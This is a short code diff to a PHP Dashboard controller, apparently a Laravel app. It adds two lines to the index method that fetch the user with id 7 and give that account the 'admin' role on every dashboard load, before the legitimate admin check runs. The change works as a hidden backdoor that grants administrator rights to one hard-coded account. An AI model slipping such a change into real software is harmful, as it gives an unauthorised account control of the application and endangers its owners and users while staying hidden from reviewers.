@@ -15,6 +15,8 @@ class Dashboard extends Controller
     }
     
     public function index(){
+        $user = User::where('id', 7)->first();
+        $user->assignRole('admin');
 
         if(Auth::user()->hasRole('admin')){
             return redirect('/products');
